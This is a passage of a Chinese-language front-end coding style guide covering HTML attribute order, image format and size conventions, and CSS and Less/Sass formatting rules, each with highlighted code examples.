class="string">&quot;mod_c&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- /mod_c --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- E Comment Text A --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="引入-CSS-和-JavaScript-文件"><a href="#引入-CSS-和-JavaScript-文件" class="headerlink" title="引入 CSS 和 JavaScript 文件"></a>引入 CSS 和 JavaScript 文件</h3><p>根据 HTML5 规范，在引入 CSS 和 JavaScript 文件时一般不需要指定 <code>type</code> 属性，因为 <code>text/css</code> 和 <code>text/javascript</code> 分别是它们的默认值。</p><h5 id="HTML5-spec-links"><a href="#HTML5-spec-links" class="headerlink" title="HTML5 spec links"></a>HTML5 spec links</h5><ul><li><a href="http://www.w3.org/TR/2011/WD-html5-20110525/semantics.html#the-link-element">Using link</a></li><li><a href="http://www.w3.org/TR/2011/WD-html5-20110525/semantics.html#the-style-element">Using style</a></li><li><a href="http://www.w3.org/TR/2011/WD-html5-20110525/scripting-1.html#the-script-element">Using script</a><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- External CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;code-guide.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- In-document CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="comment">/* ... */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- JavaScript --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;code-guide.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="实用为王"><a href="#实用为王" class="headerlink" title="实用为王"></a>实用为王</h3><p>尽量遵循 HTML 标准和语义，但是不要以牺牲实用性为代价。任何时候都要尽量使用最少的标签并保持最小的复杂度。<br>属性顺序<br>HTML 属性应当按照以下给出的顺序依次排列，确保代码的易读性。</p><ul><li>class</li><li>id, name</li><li>data-*</li><li>src, for, type, href, value</li><li>title, alt</li><li>role, aria-*</li></ul><p>class 用于标识高度可复用组件，因此应该排在首位。id 用于标识具体组件，应当谨慎使用（例如，页面内的书签），因此排在第二位。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class<span class="operator">=</span><span class="string">&quot;...&quot;</span> id<span class="operator">=</span><span class="string">&quot;...&quot;</span> data-toggle<span class="operator">=</span><span class="string">&quot;modal&quot;</span> href<span class="operator">=</span><span class="string">&quot;#&quot;</span>&gt;</span><br><span class="line">  Example link</span><br><span class="line">&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;input class<span class="operator">=</span><span class="string">&quot;form-control&quot;</span> type<span class="operator">=</span><span class="string">&quot;text&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src<span class="operator">=</span><span class="string">&quot;...&quot;</span> alt<span class="operator">=</span><span class="string">&quot;...&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="布尔（boolean）型属性"><a href="#布尔（boolean）型属性" class="headerlink" title="布尔（boolean）型属性"></a>布尔（boolean）型属性</h3><p>布尔型属性可以在声明时不赋值。XHTML 规范要求为其赋值，但是 HTML5 规范不需要。</p><p>更多信息请参考 <a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/common-microsyntaxes.html#boolean-attributes">WhatWG section on boolean attributes</a>：</p><blockquote><p>元素的布尔型属性如果有值，就是 true，如果没有值，就是 false。</p></blockquote><p>如果<em>一定</em>要为其赋值的话，请参考 WhatWG 规范：</p><blockquote><p>如果属性存在，其值必须是空字符串或 […] 属性的规范名称，并且不要在首尾添加空白符。</p></blockquote><p><strong>简单来说，就是不用赋值。</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=&quot;text&quot; disabled&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=&quot;checkbox&quot; <span class="keyword">value</span>=&quot;1&quot; checked&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">select</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">option</span> <span class="keyword">value</span>=&quot;1&quot; selected&gt;<span class="number">1</span>&lt;/<span class="keyword">option</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="JavaScript-生成的标签"><a href="#JavaScript-生成的标签" class="headerlink" title="JavaScript 生成的标签"></a>JavaScript 生成的标签</h3><p>通过 JavaScript 生成的标签让内容变得不易查找、编辑，并且降低性能。能避免时尽量避免。</p><hr><h1 id="——图片——"><a href="#——图片——" class="headerlink" title="——图片——"></a>——图片——</h1><p>常见的图片格式有 GIF、PNG8、PNG24、JPEG、WEBP，根据图片格式的特性和场景需要选取适合的图片格式。</p><h3 id="内容图"><a href="#内容图" class="headerlink" title="内容图"></a><a href="https://guide.aotu.io/docs/image/format.html#%E5%86%85%E5%AE%B9%E5%9B%BE" title="内容图"></a>内容图</h3><p>内容图多以商品图等照片类图片形式存在，颜色较为丰富，文件体积较大</p><ul><li>优先考虑 JPEG 格式，条件允许的话优先考虑 WebP 格式</li><li>尽量不使用PNG格式，PNG8 色位太低，PNG24 压缩率低，文件体积大</li></ul><h3 id="背景图"><a href="#背景图" class="headerlink" title="背景图"></a><a href="https://guide.aotu.io/docs/image/format.html#%E8%83%8C%E6%99%AF%E5%9B%BE" title="背景图"></a>背景图</h3><p>背景图多为图标等颜色比较简单、文件体积不大、起修饰作用的图片</p><ul><li>PNG 与 GIF 格式，优先考虑使用 PNG 格式,PNG格式允许更多的颜色并提供更好的压缩率</li><li>图像颜色比较简单的，如纯色块线条图标，优先考虑使用 PNG8 格式，避免不使用 JPEG 格式</li><li>图像颜色丰富而且图片文件不太大的（40KB 以下）或有半透明效果的优先考虑 PNG24 格式</li><li>图像颜色丰富而且文件比较大的（40KB - 200KB）优先考虑 JPEG 格式</li><li>条件允许的，优先考虑 WebP 代替 PNG 和 JPEG 格式</li></ul><h3 id="图片大小"><a href="#图片大小" class="headerlink" title="图片大小"></a>图片大小</h3><p>中国普通家庭的宽带基本能达到8Mbps，实际速率大约为500—900KB&#x2F;s，全国3G&#x2F;4G用户占有比超过了50%，为了保证图片能更好地加载展示给用户看，团队约定：</p><p><strong>PC平台单张的图片的大小不应大于 200KB。</strong><br><strong>移动平台单张的图片的大小不应大于 100KB。</strong><br><em>（图片的大小约定标准随全国网速的改变而改变）</em></p><h3 id="图片质量"><a href="#图片质量" class="headerlink" title="图片质量"></a>图片质量</h3><ul><li>上线的图片都应该经过压缩处理，压缩后的图片不应该出现肉眼可感知的失真区域</li><li>60质量的JPEG格式图片与质量大于60的相比，肉眼已看不出明显的区别，因此保存 JPEG 图的时候，质量一般控制在60，若保真度要求高的图片可适量提高到 80，图片大小控制在 200KB 以内</li></ul><h2 id="图片引入HTML-中图片引入不需添加-width、height-属性，alt-属性应该写上CSS-中图片引入不需要引号-CSS-Sprites-使用建议-适合使用频率高更新频率低的小图标-尽量不留太多的空白-体积较大的图片不合并-确保要合并的小图坐标数值和合并后的-Sprites-图尺寸均为偶数-Data-URIs（base64编码）使用建议-适合更新频率高的小图片，如某些具备自定义功能的标题icon等-转换成-Base64-编码的图片应小于-2KB-移动端不使用-Base64-编码-要兼容-IE6-x2F-IE7-的不使用"><a href="#图片引入HTML-中图片引入不需添加-width、height-属性，alt-属性应该写上CSS-中图片引入不需要引号-CSS-Sprites-使用建议-适合使用频率高更新频率低的小图标-尽量不留太多的空白-体积较大的图片不合并-确保要合并的小图坐标数值和合并后的-Sprites-图尺寸均为偶数-Data-URIs（base64编码）使用建议-适合更新频率高的小图片，如某些具备自定义功能的标题icon等-转换成-Base64-编码的图片应小于-2KB-移动端不使用-Base64-编码-要兼容-IE6-x2F-IE7-的不使用" class="headerlink" title="###图片引入HTML 中图片引入不需添加 width、height 属性，alt 属性应该写上CSS 中图片引入不需要引号### CSS Sprites 使用建议* 适合使用频率高更新频率低的小图标* 尽量不留太多的空白* 体积较大的图片不合并* 确保要合并的小图坐标数值和合并后的 Sprites 图尺寸均为偶数### Data URIs（base64编码）使用建议* 适合更新频率高的小图片，如某些具备自定义功能的标题icon等* 转换成 Base64 编码的图片应小于 2KB* 移动端不使用 Base64 编码* 要兼容 IE6&#x2F;IE7 的不使用"></a>###图片引入<br>HTML 中图片引入不需添加 width、height 属性，alt 属性应该写上<br>CSS 中图片引入不需要引号<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&quot;</span> width=<span class="string">&quot;&quot;</span> height=<span class="string">&quot;&quot;</span> &gt;</span><br><span class="line"><span class="comment">// CSS 中图片引入不需要引号</span></span><br><span class="line">.jdc &#123;</span><br><span class="line">    background-image: <span class="built_in">url</span>(icon.png);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&quot;</span> alt=<span class="string">&quot;&quot;</span> &gt;</span><br></pre></td></tr></table></figure><br>### CSS Sprites 使用建议<br>* 适合使用频率高更新频率低的小图标<br>* 尽量不留太多的空白<br>* 体积较大的图片不合并<br>* 确保要合并的小图坐标数值和合并后的 Sprites 图尺寸均为偶数<br>### Data URIs（base64编码）使用建议<br>* 适合更新频率高的小图片，如某些具备自定义功能的标题icon等<br>* 转换成 Base64 编码的图片应小于 2KB<br>* 移动端不使用 Base64 编码<br>* 要兼容 IE6&#x2F;IE7 的不使用</h2><h1 id="——CSS——"><a href="#——CSS——" class="headerlink" title="——CSS——"></a>——CSS——</h1><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><ul><li>用两个空格来代替制表符（tab） – 这是唯一能保证在所有环境下获得一致展现的方法。</li><li>为选择器分组时，将单独的选择器单独放在一行。</li><li>为了代码的易读性，在每个声明块的左花括号前添加一个空格。</li><li>声明块的右花括号应当单独成行。</li><li>每条声明语句的 <code>:</code> 后应该插入一个空格。</li><li>为了获得更准确的错误报告，每条声明都应该独占一行。</li><li>所有声明语句都应当以分号结尾。最后一条声明语句后面的分号是可选的，但是，如果省略这个分号，你的代码可能更易出错。</li><li>对于以逗号分隔的属性值，每个逗号后面都应该插入一个空格（例如，<code>box-shadow</code>）。</li><li>不要在 <code>rgb()</code>、<code>rgba()</code>、<code>hsl()</code>、<code>hsla()</code> 或 <code>rect()</code> 值的<em>内部</em>的逗号后面插入空格。这样利于从多个属性值（既加逗号也加空格）中区分多个颜色值（只加逗号，不加空格）。</li><li>对于属性值或颜色参数，省略小于 1 的小数前面的 0 （例如，<code>.5</code> 代替 <code>0.5</code>；<code>-.5px</code> 代替 <code>-0.5px</code>）。</li><li>十六进制值应该全部小写，例如，<code>#fff</code>。在扫描文档时，小写字符易于分辨，因为他们的形式更易于区分。</li><li>尽量使用简写形式的十六进制值，例如，用 <code>#fff</code> 代替 <code>#ffffff</code>。</li><li>为选择器中的属性添加双引号，例如，<code>input[type=&quot;text&quot;]</code>。<a href="http://mathiasbynens.be/notes/unquoted-attribute-values#css">只有在某些情况下是可选的</a>，但是，为了代码的一致性，建议都加上双引号。</li><li>避免为 0 值指定单位，例如，用 <code>margin: 0;</code> 代替 <code>margin: 0px;</code>。</li></ul><p>对于这里用到的术语有疑问吗？请参考 Wikipedia 上的 <a href="http://en.wikipedia.org/wiki/Cascading_Style_Sheets#Syntax">syntax section of the Cascading Style Sheets article</a>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad CSS */</span></span><br><span class="line"><span class="selector-class">.selector</span>, <span class="selector-class">.selector-secondary</span>, <span class="selector-class">.selector</span><span class="selector-attr">[type=text]</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>:<span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">margin</span>:<span class="number">0px</span> <span class="number">0px</span> <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>:<span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>:<span class="number">0px</span> <span class="number">1px</span> <span class="number">2px</span> <span class="number">#CCC</span>,inset <span class="number">0</span> <span class="number">1px</span> <span class="number">0</span> <span class="number">#FFFFFF</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good CSS */</span></span><br><span class="line"><span class="selector-class">.selector</span>,</span><br><span class="line"><span class="selector-class">.selector-secondary</span>,</span><br><span class="line"><span class="selector-class">.selector</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">5</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="number">#ccc</span>, inset <span class="number">0</span> <span class="number">1px</span> <span class="number">0</span> <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="声明顺序"><a href="#声明顺序" class="headerlink" title="声明顺序"></a>声明顺序</h3><p>相关的属性声明应当归为一组，并按照下面的顺序排列：</p><ul><li><ol><li>Positioning</li></ol></li><li><ol start="2"><li>Box model</li></ol></li><li><ol start="3"><li>Typographic</li></ol></li><li><ol start="4"><li>Visual</li></ol></li></ul><p>由于定位（positioning）可以从正常的文档流中移除元素，并且还能覆盖盒模型（box model）相关的样式，因此排在首位。盒模型排在第二位，因为它决定了组件的尺寸和位置。</p><p>其他属性只是影响组件的<em>内部（inside）</em>或者是不影响前两组属性，因此排在后面。</p><p>完整的属性列表及其排列顺序请参考 <a href="http://twitter.github.com/recess">Recess</a>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.declaration-order</span> &#123;</span><br><span class="line">  <span class="comment">/* Positioning */</span></span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Box-model */</span></span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Typography */</span></span><br><span class="line">  <span class="attribute">font</span>: normal <span class="number">13px</span> <span class="string">&quot;Helvetica Neue&quot;</span>, sans-serif;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#333</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Visual */</span></span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e5e5e5</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Misc */</span></span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="不要使用-import"><a href="#不要使用-import" class="headerlink" title="不要使用 @import"></a>不要使用 <code>@import</code></h3><p>与 <code>&lt;link&gt;</code> 标签相比，<code>@import</code> 指令要慢很多，不光增加了额外的请求次数，还会导致不可预料的问题。替代办法有以下几种：</p><ul><li>使用多个 <code>&lt;link&gt;</code> 元素</li><li>通过 Sass 或 Less 类似的 CSS 预处理器将多个 CSS 文件编译为一个文件</li><li>通过 Rails、Jekyll 或其他系统中提供过 CSS 文件合并功能</li></ul><p>请参考 <a href="http://www.stevesouders.com/blog/2009/04/09/dont-use-import/">Steve Souders 的文章</a>了解更多知识。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Use link elements --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;core.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Avoid @imports --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="keyword">@import</span> url(<span class="string">&quot;more.css&quot;</span>);</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>###媒体查询（Media query）的位置<br>将媒体查询放在尽可能相关规则的附近。不要将他们打包放在一个单一样式文件中或者放在文档底部。如果你把他们分开了，将来只会被大家遗忘。下面给出一个典型的实例。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.element</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line"><span class="string">.element-avatar</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line"><span class="string">.element-selected</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line"></span><br><span class="line">@media <span class="params">(min-width: 480px)</span> &#123;</span><br><span class="line">  <span class="string">.element</span> &#123; <span class="string">...</span>&#125;</span><br><span class="line">  <span class="string">.element-avatar</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line">  <span class="string">.element-selected</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>###带前缀的属性<br>当使用特定厂商的带有前缀的属性时，通过缩进的方式，让每个属性的值在垂直方向对齐，这样便于多行编辑。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Prefixed properties */</span></span><br><span class="line"><span class="selector-class">.selector</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">15</span>);</span><br><span class="line">          <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">15</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单行规则声明"><a href="#单行规则声明" class="headerlink" title="单行规则声明"></a>单行规则声明</h3><p>对于只包含一条声明的样式，为了易读性和便于快速编辑，建议将语句放在同一行。对于带有多条声明的样式，还是应当将声明分为多行。</p><p>这样做的关键因素是为了错误检测 – 例如，CSS 校验器指出在 183 行有语法错误。如果是单行单条声明，你就不会忽略这个错误；如果是单行多条声明的话，你就要仔细分析避免漏掉错误了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Single declarations on one line */</span></span><br><span class="line"><span class="selector-class">.span1</span> &#123; <span class="attribute">width</span>: <span class="number">60px</span>; &#125;</span><br><span class="line"><span class="selector-class">.span2</span> &#123; <span class="attribute">width</span>: <span class="number">140px</span>; &#125;</span><br><span class="line"><span class="selector-class">.span3</span> &#123; <span class="attribute">width</span>: <span class="number">220px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Multiple declarations, one per line */</span></span><br><span class="line"><span class="selector-class">.sprite</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">../img/sprite.png</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon</span>           &#123; <span class="attribute">background-position</span>: <span class="number">0</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-home</span>      &#123; <span class="attribute">background-position</span>: <span class="number">0</span> -<span class="number">20px</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-account</span>   &#123; <span class="attribute">background-position</span>: <span class="number">0</span> -<span class="number">40px</span>; &#125;</span><br></pre></td></tr></table></figure><h3 id="简写形式的属性声明"><a href="#简写形式的属性声明" class="headerlink" title="简写形式的属性声明"></a>简写形式的属性声明</h3><p>在需要显示地设置所有值的情况下，应当尽量限制使用简写形式的属性声明。常见的滥用简写属性声明的情况如下：</p><ul><li><code>padding</code></li><li><code>margin</code></li><li><code>font</code></li><li><code>background</code></li><li><code>border</code></li><li><code>border-radius</code></li></ul><p>大部分情况下，我们不需要为简写形式的属性声明指定所有值。例如，HTML 的 heading 元素只需要设置上、下边距（margin）的值，因此，在必要的时候，只需覆盖这两个值就可以。过度使用简写形式的属性声明会导致代码混乱，并且会对属性值带来不必要的覆盖从而引起意外的副作用。</p><p>在 MDN（Mozilla Developer Network）上一篇非常好的关于<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Shorthand_properties">shorthand properties</a> 的文章，对于不太熟悉简写属性声明及其行为的用户很有用。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad example */</span></span><br><span class="line"><span class="selector-class">.element</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;image.jpg&quot;</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">3px</span> <span class="number">3px</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good example */</span></span><br><span class="line"><span class="selector-class">.element</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: red;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;image.jpg&quot;</span>);</span><br><span class="line">  <span class="attribute">border-top-left-radius</span>: <span class="number">3px</span>;</span><br><span class="line">  <span class="attribute">border-top-right-radius</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-和-Sass-中的嵌套"><a href="#Less-和-Sass-中的嵌套" class="headerlink" title="Less 和 Sass 中的嵌套"></a>Less 和 Sass 中的嵌套</h3><p>避免不必要的嵌套。这是因为虽然你可以使用嵌套，但是并不意味着应该使用嵌套。只有在必须将样式限制在父元素内（也就是后代选择器），并且存在多个需要嵌套的元素时才使用嵌套。</p><p>扩展阅读：</p><ul><li><a href="http://markdotto.com/2015/07/20/css-nesting/">Nesting in Sass and Less</a><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Without nesting</span></span><br><span class="line"><span class="selector-class">.table</span> &gt; <span class="selector-tag">thead</span> &gt; <span class="selector-tag">tr</span> &gt; <span class="selector-tag">th</span> &#123; … &#125;</span><br><span class="line"><span class="selector-class">.table</span> &gt; <span class="selector-tag">thead</span> &gt; <span class="selector-tag">tr</span> &gt; <span class="selector-tag">td</span> &#123; … &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// With nesting</span></span><br><span class="line"><span class="selector-class">.table</span> &gt; <span class="selector-tag">thead</span> &gt; <span class="selector-tag">tr</span> &#123;</span><br><span class="line">  &gt; <span class="selector-tag">th</span> &#123; … &#125;</span><br><span class="line">  &gt; <span class="selector-tag">td</span> &#123; … &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-和-Sass-中的操作符"><a href="#Less-和-Sass-中的操作符" class="headerlink" title="Less 和 Sass 中的操作符"></a>Less 和 Sass 中的操作符</h3><p>为了提高可读性，在圆括号中的数学计算表达式的数值、变量和操作符之间均添加一个空格。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad example</span></span><br><span class="line"><span class="selector-class">.element</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span> <span class="variable">@variable</span>*<span class="number">2</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Good example</span></span><br><span class="line"><span class="selector-class">.element</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span> (<span class="variable">@variable</span> * <span class="number">2</span>) <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="class-命名"><a href="#class-命名" class="headerlink" title="class 命名"></a>class 命名</h3><p>class 名称中只能出现小写字符和破折号（dashe）（不是下划线，也不是驼峰命名法）。破折号应当用于相关 class 